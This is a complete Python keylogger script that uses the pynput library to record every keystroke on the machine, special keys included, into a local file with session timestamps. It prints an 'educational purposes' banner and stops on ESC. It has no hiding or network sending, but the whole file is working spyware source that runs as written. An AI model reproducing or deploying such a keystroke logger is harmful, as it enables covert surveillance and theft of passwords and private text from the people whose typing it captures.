# keylogger_simple.py
from pynput import keyboard
import datetime

class SimpleKeyLogger:
    def __init__(self, log_file="keystrokes.txt"):
        self.log_file = log_file
        self.log_content = []
        
    def write_to_file(self, content):
        """Write keystrokes to file"""
        with open(self.log_file, 'a') as f:
            f.write(content)
    
    def on_press(self, key):
        try:
            # Handle alphanumeric keys
            if hasattr(key, 'char') and key.char is not None:
                keystroke = key.char
                self.write_to_file(keystroke)
                print(keystroke, end='', flush=True)  # Echo to console
                
            # Handle special keys
            else:
                special_keys = {
                    keyboard.Key.space: ' ',
                    keyboard.Key.enter: '\n[ENTER]\n',
                    keyboard.Key.backspace: '[BACKSPACE]',
                    keyboard.Key.tab: '[TAB]',
                    keyboard.Key.shift: '[SHIFT]',
                    keyboard.Key.ctrl_l: '[CTRL]',
                    keyboard.Key.ctrl_r: '[CTRL]',
                    keyboard.Key.alt_l: '[ALT]',
                    keyboard.Key.alt_r: '[ALT]',
                    keyboard.Key.cmd: '[WIN]',
                    keyboard.Key.delete: '[DELETE]',
                    keyboard.Key.up: '[UP]',
                    keyboard.Key.down: '[DOWN]',
                    keyboard.Key.left: '[LEFT]',
                    keyboard.Key.right: '[RIGHT]'
                }
                
                if key in special_keys:
                    keystroke = special_keys[key]
                    self.write_to_file(keystroke)
                    print(keystroke, end='', flush=True)
                    
        except Exception as e:
            print(f"\nError: {e}")
    
    def on_release(self, key):
        # Stop listener on ESC key
        if key == keyboard.Key.esc:
            print("\n\nKeylogger stopped. Check", self.log_file)
            return False
    
    def start(self):
        """Start the keylogger"""
        print("=" * 50)
        print("KEYLOGGER SIMULATOR - EDUCATIONAL PURPOSES")
        print("=" * 50)
        print(f"Logging to: {self.log_file}")
        print("Press ESC to stop logging")
        print("-" * 50)
        print("Keystrokes (live):")
        print("-" * 50)
        
        # Add timestamp to log file
        with open(self.log_file, 'a') as f:
            f.write(f"\n{'='*50}\n")
            f.write(f"Session started: {datetime.datetime.now()}\n")
            f.write(f"{'='*50}\n\n")
        
        # Start listening
        with keyboard.Listener(
            on_press=self.on_press,
            on_release=self.on_release
        ) as listener:
            listener.join()

if __name__ == "__main__":
    logger = SimpleKeyLogger()
    logger.start()